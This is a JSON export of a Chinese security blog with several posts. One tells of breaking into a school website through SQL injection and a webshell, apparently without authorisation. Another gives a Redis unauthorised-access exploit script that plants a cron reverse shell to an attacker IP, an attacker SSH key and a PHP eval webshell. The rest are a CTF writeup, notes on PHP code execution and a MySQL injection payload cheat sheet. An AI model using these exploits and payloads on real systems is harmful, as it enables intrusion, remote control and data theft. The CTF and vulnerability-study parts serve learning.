[{"title":"双内网渗透代理之reGeorg+Proxifier","date":"2016-12-20T06:01:55.000Z","path":"2016/12/20/双内网渗透代理之reGeorg-Proxifier/","text":"昨天友情检测了一下学校某网站，一开始就发现一个sql注入，这里就不详细介绍sql注入详细过程了，很常规的一个思路，通过页面报错得到是用wamp搭建的站，mysql为root权限，读到配置文件，得到网站的根目录，写下马，菜刀连之，发现是system 权限，而且3389端口开放。这时候出现了问题，外网访问3389端口的时候，发现连接不上，只对内网开放。这就很尴尬了，我在内网中，服务器也在内网中，而且我没有公网机器，那么该怎么办？尝试利用reDuh和Tunna都利用不成功，因为php无socket扩展。最后终于在github上找到了reGeorg，配合Proxifier终于连接进去内网了。 由于这个工具第一次体验感觉还不错，很稳定。因此在这记录一下reGeorg+Proxifier的配置及其使用。 下载地址 ：https://github.com/sensepost/reGeorg.git其中.py是py的proxy脚本，其他后缀的都是对应的web服务器与proxy连接的文件。 由于我拿的这个网站是php的，所以将tunnel.nosocket.php上传至web服务器，访问此文件若显示如下图，则第一步完成。第二步：运行py脚本(先安装socket3模块)第三步：配置Proxifier打开软件后，进入代理服务器，添加然后将代理规则改成 proxy socket5 127.0.0.1这时候访问，成功进入连上3389","tags":[]},{"title":"记录以前写的两个爬虫","date":"2016-12-09T14:24:25.000Z","path":"2016/12/09/spider1/","text":"记录两个以前写的爬虫第一个，是对糗事百科热门段子的爬取，主要是用了python自带模块urllib和urllib2,来进行http访问，利用re模块来进行html正则匹配 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768#!/usr/bin/python#coding:utf-8import urllib,urllib2,re,time#糗事百科爬虫类class QSBK: #初始化方法，定义一些变量 def __init__(self): self.page = 1 self.enable = True self.stories = [] #全局存储页面段子 self.headers =&#123;'User-Agent':'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'&#125; def getPage(self,page): try: url = 'http://www.qiushibaike.com/hot/page/'+str(page)+'/?s=4937924' header =&#123;'User-Agent':'Mozilla/4.0 (compatible; MSIE 5.5; Windows NT)'&#125; request = urllib2.Request(url,headers = header) response = urllib2.urlopen(request) content = response.read().decode('utf-8') return content except urllib2.URLError, e: if hasattr(e, \"reason\"): print e.reason return None #传入某一页，返回段子列表 def getPageItems(self,page): pageCode = self.getPage(page) pageStories = [] pattern = re.compile('&lt;div.*?clearfix\"&gt;.*?&lt;img.*?&lt;a href.*?&lt;h2&gt;(.*?)&lt;/h2&gt;.*?content\"&gt;.*?&lt;span&gt;(.*?)&lt;/span&gt;.*?&lt;i class=\"number\"&gt;(.*?)&lt;/i&gt;.*?&lt;/span&gt;',re.S) items = re.findall(pattern, pageCode) for item in items: replacestr = re.compile(\"&lt;br/&gt;\") text = re.sub(replacestr, '\\n', item[1]) pageStories.append([item[0].strip(),text.strip(),item[2].strip()]) return pageStories #加载并提供页面内容 def loadPage(self): #如果用户输入任意键 if self.enable == True: #如果页面少于两页，加载新一页 if len(self.stories) &lt; 2 : pageStories = self.getPageItems(self.page) if pageStories: self.stories.append(pageStories) self.page += 1 def loadStory(self, pageStories, page): #遍历段子 for story in pageStories: input = raw_input() self.loadPage() #如果输入“q” 退出 if input == 'q': self.enable == False return print u\"第%s页\\t发布人：%s\\t\\n段子：\\n%s\\t\\n点赞数：%s\\t\" %(page,story[0],story[1],story[2]) def start(self): print u\"正在连接糗事百科，按回车查看新段子，q退出\" #初始化变量为真，是程序运行，并加载一页 self.loadPage() nowpage = 0 #控制当前页数 while self.enable: if len(self.stories)&gt;0: #从全局获取一页段子 pagestories = self.stories[0] nowpage += 1 del self.stories[0] self.loadStory(pagestories, nowpage)spider = QSBK()spider.start() 第二个使用requests模块和json模块对ichunqiu课程的爬取1234567891011121314151617#!/usr/bin/python#coding:utf-8import requestsimport jsonx=0data = \"courseTag=&amp;courseDiffcuty=&amp;IsExp=&amp;producerId=&amp;orderField=&amp;orderDirection=&amp;pageIndex=2&amp;tagType=2\"headers = &#123; \"User-Agent\":\"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/55.0.2883.75 Safari/537.36\"&#125;url = 'http://www.ichunqiu.com/courses/ajaxCourses'#print r.text #res = json.loads(r.text)for i in range(0,11): r = requests.post(url,data=\"courseTag=&amp;courseDiffcuty=&amp;IsExp=&amp;producerId=&amp;orderField=&amp;orderDirection=&amp;pageIndex=\"+str(i)+\"&amp;tagType=2\", headers=headers) res = json.loads(r.text) for j in range(0,19): print res['course']['result'][j]['courseName']","tags":[]},{"title":"redis未授权访问总结","date":"2016-12-08T12:12:35.000Z","path":"2016/12/08/redis/","text":"redis简介redis是一个key-value存储系统。和Memcached类似，它支持存储的value类型相对更多，包括string(字符串), list(链表), set(集合), zset(sorted set -有序集合)和hash（哈希类型）。这些数据类型都支持push/pop、add/remove及取交集并集和差集及更丰富的操作，而且这些操作都是原子性的。在此基础上，redis支持各种不同方式的排序。与memcached一样，为了保证效率，数据都是缓存在内存中。区别的是redis会周期性的把更新的数据写入磁盘或者把修改操作写入追加的记录文件，并且在此基础上实现了master-slave(主从)同步。redis写文件的权限就是redis运行权限，写文件既可以指定目录，也可以指定文件名。 getshell假设redis以root权限运行，常规的思路，我们有三种方法进行getshell，一个是再web目录写一句话getshell，一个是反弹shell来getshell，一个是生成ssh密钥写进.ssh文件，从而实现免密码登录 如果服务器开启web服务(以kali linux2.0为例)，我们可以在/var/www/html目录写入一句话进行getshell 以centos为例bash反弹先在kali 上监听一个端口nc -lvvp 12345然后在centos上执行这时发现反弹成功 以centos为例通过写入authorized_keys getshell首先在本地生产一对密钥然后将id_rsa.pub文件写入redis服务器./ssh/目录，然后ssh免密码登录 最后附上python exploit脚本包含以上三种方法的123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#!/usr/bin/python#coding:utf-8import redisfrom optparse import OptionParser#centos下redis可用def shell_exploit(host, port=6379): print host try: r =redis.StrictRedis(host=host,port=port,db=0,socket_timeout=2) r.set(1, '\\n\\n*/1 * * * * /bin/bash -i &gt;&amp; /dev/tcp/192.168.139.128/9999 0&gt;&amp;1\\n\\n') r.config_set('dir','/var/spool/cron') r.config_set('dbfilename','root') r.save() print \"攻击完毕！ 请耐心等待\" except: print \"检查配置是否正确!\" passdef ssh_exploit(host, port): authorized_keys = \"ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDF/S3zVaLVA5g0tBaYhPWDQ057S8xbygb5auwdRtKh7XUli3l9KQPSZjQcVHU17fdMjkICSS1D5g5kk5hfc1EDww2cKvogOuzNB8qakvGkVNt72YlazAzV4V8vsHHa4AoS/tACGg454pFl1z6qcS8fXZsLKIB86HapHh36d9upQGzbBmD7w5Vz8DU1+IYbd0c5y8z4cXLT+1MVyVn2JJb3UBPCRxWbCIyqUpxm0WLRtGboeAXQeQVZRofIrz9Q+eiXg2D1+eDnECoJJVd81oVM0OfxznZ79TiSWEfRX+d0DFAVkj+ubY0KtIR1KMBYLdNmR2vcfNGQIEf21erqQDcZ root@kali2\" ssh_content = \"\\n\\n\\n\\n\"+authorized_keys+\"\\n\\n\\n\\n\" print host try: r =redis.StrictRedis(host=host,port=port,db=0,socket_timeout=2) print ssh_content r.set(1, ssh_content) r.config_set('dir','/root/.ssh/') r.config_set('dbfilename','authorized_keys') r.save() print \"攻击完毕！ 请耐心等待\" except: print \"检查配置是否正确!\" passdef web_exploit(host, port): try: r =redis.StrictRedis(host=host,port=port,db=0,socket_timeout=10) r.config_set('dir','/var/www/html/') r.config_set('dbfilename','fuck.php') r.set(1, \"&lt;?php @eval($_POST['chopper']);?&gt;\") print \"11111\" r.save() print \"攻击完毕！ 请用菜刀验证\" except: print \"检查配置是否正确!\" passdef main(): parser = OptionParser() parser.add_option(\"-u\", \"--url\", dest=\"url\", help=\"attack redis url\") parser.add_option(\"-m\", \"--mode\", dest=\"mode\", help=\"shell/ssh/web\", default=\"shell\") parser.add_option(\"-p\", \"--port\", dest=\"port\", type=\"int\", help=\"attack redis port,default:6379\", default=6379) (options, args) = parser.parse_args() mode = options.mode print mode url = options.url port = options.port if mode == None: shell_exploit(url, port) return elif mode == \"shell\": shell_exploit(url, port) return elif mode == \"web\": web_exploit(url, port) return else: ssh_exploit(url, port) return if __name__ == \"__main__\": main()","tags":[]},{"title":"hctf2016 writeup","date":"2016-11-27T13:45:29.000Z","path":"2016/11/27/hctf2016-writeup/","text":"这次ctf分数是采用动态分数，而且题目是分关的，无奈一个人打只打到第三层，没看到后面的web题目，觉得还是有点可惜。 Level-1misc根据题目链接下载了一个流量包文件，打开简单分析了一下内容。管理员登录bash后查看function.py的内容，代码如下1234567891011121314151617181920212223242526#!/usr/bin/env python# coding:utf-8__author__ = 'Aklis'from Crypto import Randomfrom Crypto.Cipher import AESimport sysimport base64def decrypt(encrypted, passphrase): IV = encrypted[:16] aes = AES.new(passphrase, AES.MODE_CBC, IV) return aes.decrypt(encrypted[16:])def encrypt(message, passphrase): IV = message[:16] length = 16 count = len(message) padding = length - (count % length) message = message + '\\0' * padding aes = AES.new(passphrase, AES.MODE_CBC, IV) return aes.encrypt(message)IV = 'YUFHJKVWEASDGQDH'message = IV + 'flag is hctf&#123;xxxxxxxxxxxxxxx&#125;'print len(message)example = encrypt(message, 'Qq4wdrhhyEWe4qBF')print exampleexample = decrypt(example, 'Qq4wdrhhyEWe4qBF') print example 此外,流量中还获取到了密文flag的base64形式: mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA== 根据代码中的解密算法可得到flag123456789101112131415161718192021222324252627#!/usr/bin/env python# coding:utf-8__author__ = 'Aklis'from Crypto import Randomfrom Crypto.Cipher import AESimport sysimport base64def decrypt(encrypted, passphrase): IV = encrypted[:16] aes = AES.new(passphrase, AES.MODE_CBC, IV) return aes.decrypt(encrypted[16:])def encrypt(message, passphrase): IV = message[:16] length = 16 count = len(message) padding = length - (count % length) message = message + '\\0' * padding aes = AES.new(passphrase, AES.MODE_CBC, IV) return aes.encrypt(message)IV = 'YUFHJKVWEASDGQDH'#message = IV + 'flag is hctf&#123;xxxxxxxxxxxxxx&#125;'message = base64.b64decode('mbZoEMrhAO0WWeugNjqNw3U6Tt2C+rwpgpbdWRZgfQI3MAh0sZ9qjnziUKkV90XhAOkIs/OXoYVw5uQDjVvgNA==')print len(message)#example = encrypt(message, 'Qq4wdrhhyEWe4qBF')#print exampleexample = decrypt(message, 'Qq4wdrhhyEWe4qBF') print example web 2099年的flag描述：only ios99 can get flag(Maybe you can easily get the flag in 2099看到描述后，果断构造UA得到flag： hctf{h77p_He4dEr_50_E4sy} level-2web RESTFUL 打开后看到 “Please me some more than &lt;12450&gt;!”再结合源代码看到的js,这道题考察队restful架构uri的认识,构造以下请求代码即可得到flag misc pic again 使用神器Stegsolve进行分析，发现图片最低有效位隐藏了一个rar文件，对这个文件进行修复后解压缩，得到一个linux可执行文件，直接strings 得到flag msic gogogo下载下来是一个魂斗罗，在模拟器里加上金手指通关，即获得flag，忘截图了！ web 兵者多诡这道题目是比较接近实战的一个题目，文件包含+文件上传getshell，首先通关包含漏洞拿到这道题的源码。然后去分析源码，发现不论上传什么，上传成功后都会被重命名随机数.png。 我开始的思路是上传一个执行命令的小马，然后用%00,或者？等去截断，但是一直都失败。然后我换了一个思路，上传zip包，zip包里有一个php小马，然后在用zip://协议去读，成功读取。 gustbook一进去发现是个留言板，里面有一个类似于验证码的东西，本地fuzz一下123456789101112131415161718#usr/bin/pythonimport hashlibdic = ['1','2','3','4','5','6','7','8','9','0','a','b','c','d','e','f','g','h','i','j','k','l','m','n','o','p','q','r','s','t','u','v','w','x','y','z']for x in range(len(dic)): for y in range(len(dic)): for z in range(len(dic)): for k in range(len(dic)): str1 = dic[x] +dic[y] + dic[z] + dic[k] m2 = hashlib.md5() m2.update(str1) str2 = m2.hexdigest() #print str2 f.writelines(str1) f.writelines('\\n') f.writelines(str2) if str2[0:4] =='3644': print str2 print str1 这道题当时fuzz出来过滤了on,script,但是没绕过csp，因此没拿到flag","tags":[]},{"title":"php漏洞之代码执行","date":"2016-11-27T12:33:50.000Z","path":"2016/11/27/php-e6-bc-8f-e6-b4-9e-e4-b9-8b-e4-bb-a3-e7-a0-81-e6-89-a7-e8-a1-8c/","text":"php漏洞之执行漏洞 执行漏洞分为代码执行漏洞和命令执行漏洞。代码执行漏洞是代码执行漏洞是指应用程序过滤不严格，用户可以通过请求将代码注入到应用中去。而命令执行漏洞是指可以执行系统命令或者应用指令(cmd命令或bash)的漏洞，php的命令执行漏洞主要基于一些函数的过滤不严导致 代码执行静态函数执行eval函数和assert函数这两个函数都是将它们的参数直接当做php代码来执行,测试代码如下123&lt;?phpassert('phpinfo()');?&gt; preg_replace()函数preg_replace()函数作用是对字符串进行正则处理，测试代码如下123&lt;?phppreg_replace('/\\[(.*)\\]/e', '\\\\1', $_GET['str']);?&gt; 动态函数执行123&lt;?php$_GET['a']($_GET['b']);?&gt; 回调函数执行call_user_func()和array_map()等多个函数都有调用其他函数的功能，其中一个参数为要调用的函数名，如果这个传入的函数名可控，那么就可以进行代码注入以call_user_func()为例，写一个小demo：1234&lt;?php$b = \"phpinfo()\";call_user_func($_GET['a'],$b);?&gt; 文件包含利用文件包含漏洞进行代码执行。如本地包含、远程包含（allow_url_include=on）、及各种协议(filter、input等)，以及包含截断的姿势：%00截断、 windows 240个./截断 、linux下2038个./组合截断、？伪截断php://filter/convert.base64-encode/resourcephp://inputphp://zipphp://phardata:text/plain,等等 命令执行漏洞php里有7个常用函数可以执行命令，分别是system(),exec(),shell_exec(),pcntl_exec(),popen(),pro_open(),还有反引号(它使用shell_exec())函数来执行命令的 防命令注入函数escapeshellcmd()和escapeshellarg","tags":[]},{"title":"php漏洞之mysql注入","date":"2016-11-06T13:57:37.000Z","path":"2016/11/06/mysql-e6-b3-a8-e5-85-a5-e6-80-bb-e7-bb-93-ef-bc-88-e4-ba-8c-ef-bc-89/","text":"所谓SQL注入，就是通过把SQL命令插入到Web表单提交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。具体来说，它是利用现有应用程序，将（恶意）的SQL命令注入到后台数据库引擎执行的能力，它可以通过在Web表单中输入（恶意）SQL语句得到一个存在安全漏洞的网站上的数据库，而不是按照设计者意图去执行SQL语句。在这篇文章中我会总结我以前遇到过的各种关于sql注入的手法 mysql union注入基于数字型 本次演示所有注入漏洞都是基于上图测试代码如下：123456789101112131415161718&lt;?php$user = $_GET['user'];$uuser = addslashes($user);$_mysqli = new mysqli('127.0.0.1','root','root','test');if (mysqli_connect_errno()) &#123;echo '数据库连接错误！错误代码：'.mysqli_connect_error();exit();&#125;$_mysqli-&gt;set_charset('gbk');$sql = \"select * from sql_test where user = '$uuser'\";echo $sql.\"\";$results = $_mysqli-&gt;query($sql) or die($_mysqli-&gt;error);if ($results)&#123;$rows = $results-&gt;fetch_array();echo \"user:\".$rows[1];&#125;?&gt; 利用方法如下：poc：-1 union select 1,user(),3 其中，user()：当前用户 还可以替换为database():数据库、version():数据库版本、@@version_compile_os:服务器操作系统、@@datadir: 数据路径 在渗透过程中，如果要是能够判断mysql具有读写权限，则我们就可以直接写马到web目录，进而获得webshell1).判断是否有读写权限：and (select count(*) from mysql.user)&gt;0and (select count(file_priv) from mysql.user)&gt;0 2)有了读写权限，我们还需要知道web目录的路径，这时候就需要我们自己的经验来获得了，如sql报错显示路径等。使用load_file()进行读取、使用 into outfile 和 dumpfile，其中的路径和内容我们可以load_file(char(32,26,56,66))和load_file(0x633A5C626F6F742E696E69)来绕过某些waf 3)如果没有读写权限，我们还可以使用information_schema进行查询库中表、列、字段信息.a.查询表的信息：http://localhost/sql_injection/union.php?id=-1 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema = 0x74657374 b.查询列的信息：http://localhost/sql_injection/union.php?id=-1 UNION SELECT 1,group_concat(column_name),3 from information_schema.columns where table_name =0x73716C5F74657374 c.查询字段信息：http://localhost/sql_injection/union.php?id=-1 UNION SELECT 1,group_concat(id,0x3a,user,0x3a,pass),3 from sql_test 基于字符型的注入基于字符型的注入原理与数字型类似，主要区别在于单引号的闭合 宽字节注入当使用gbk编码时，使用%df%27等闭合单引号后，参考数字型注入 mysql报错注入mysql常见三种报错：floor()报错： id=1 and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) extractvalue(): id=1 and (extractvalue(1,concat(0x5c,(select user())))) updatexml(): id=1 and (updatexml(1,concat(0x5e24,(select user()),0x5e24),1)) insert注入示例代码：1234567891011121314151617&lt;?php$user = $_GET['user'];$pass = $_GET['pass'];$_mysqli = new mysqli('127.0.0.1','root','root','test');if (mysqli_connect_errno()) &#123;echo '数据库连接错误！错误代码：'.mysqli_connect_error();exit();&#125;$_mysqli-&gt;set_charset('utf8');$sql = \"INSERT INTO `sql_test`( `user`, `pass`) values ('$user','$pass')\";$results = $_mysqli-&gt;query($sql) or die($_mysqli-&gt;error);if($results)&#123;echo $sql.\"\";&#125;?&gt; poc：&#39; and (extractvalue(1,concat(0x7e,(select user()),0x7e))))-- - update注入示例代码：12345678910111213141516171819&lt;?php//update注入实例//poc: ' or (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- - // 如果没有 or die($_mysqli-&gt;error)呢？ 该怎么利用$user = $_GET['user'];$pass = $_GET['pass'];$_mysqli = new mysqli('127.0.0.1','root','root','test');if (mysqli_connect_errno()) &#123;echo '数据库连接错误！错误代码：'.mysqli_connect_error();exit();&#125;//update user set user=$user,pass=$pass$_mysqli-&gt;set_charset('utf8');$sql = \"update sql_test set user='$user',pass='$pass'\";echo $sql.\"\";$results = $_mysqli-&gt;query($sql) or die($_mysqli-&gt;error);?&gt; poc：&#39; or (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- - delete注入示例代码12345678910111213141516171819&lt;?php//delete注入实例//poc: ' or (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- - // 如果没有 or die($_mysqli-&gt;error)呢？ 该怎么利用$user = $_GET['user'];//$pass = $_GET['pass'];$_mysqli = new mysqli('127.0.0.1','root','root','test');if (mysqli_connect_errno()) &#123;echo '数据库连接错误！错误代码：'.mysqli_connect_error();exit();&#125;//delete from user where user=$user$_mysqli-&gt;set_charset('utf8');$sql = \"delete from sql_test where user='$user'\";echo $sql.\"\";$results = $_mysqli-&gt;query($sql) or die($_mysqli-&gt;error);?&gt; poc: &#39; or (extractvalue(1,concat(0x7e,(select user()),0x7e)))-- - order by 注入select * from sql_test order by (SELECT 1 from (select count(*),concat(floor(rand(0)*2),(substring((select(user())),1,62)))a from information_schema.tables group by a)b); limit 注入这里以一道ctf题进行演示，地址为：http://lab1.xseclab.com/sqli5_5ba0bba6a6d1b30b956843f757889552/index.php?start=0&amp;num=1poc:procedure analyse(extractvalue(rand(),concat(0x3a,version())),1)%23 盲注基于表达式的盲注（ascii法）首先了解几个关于mysql的函数:(1).substring(expression, start, length) 返回字符、二进制、文本或图像表达式的一部分(2).assic(str) 最左边的字符串str返回的数值对于上面的union注入，还可以这样注入： 基于表达式的盲注(正则表达式法)poc : and 1=(SELECT 1 FROM information_schema.tables WHERE TABLE_SCHEMA=database() AND table_name REGEXP &#39;^s&#39; LIMIT 0,1)-- - 基于时间的盲注首先来了解几个关于mysql的函数(1).find_in_set(str,strlist) 查询字段(strlist)中包含(str)的结果strlist 字段名 参数以”,”分隔 如 (1,2,6,8)(2).mid(column_name,start[,length])(3).if(expr1,expr2,expr3) 如果expr1表达式为真，则返回expr2，否则返回expr3 基于报错的时间盲注select 1,2 union select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x 简化后：select count(*) from information_schema.tables group by concat( version(),floor(rand(0)*2)) 关键表被禁后：select count(*) from information_schema.tables group by concat( version(),floor(rand(0)*2)) rand()被禁后select min(@a:=1) from information_schema.tables group by concat (password,@a:=(@a+1)%2)","tags":[]}]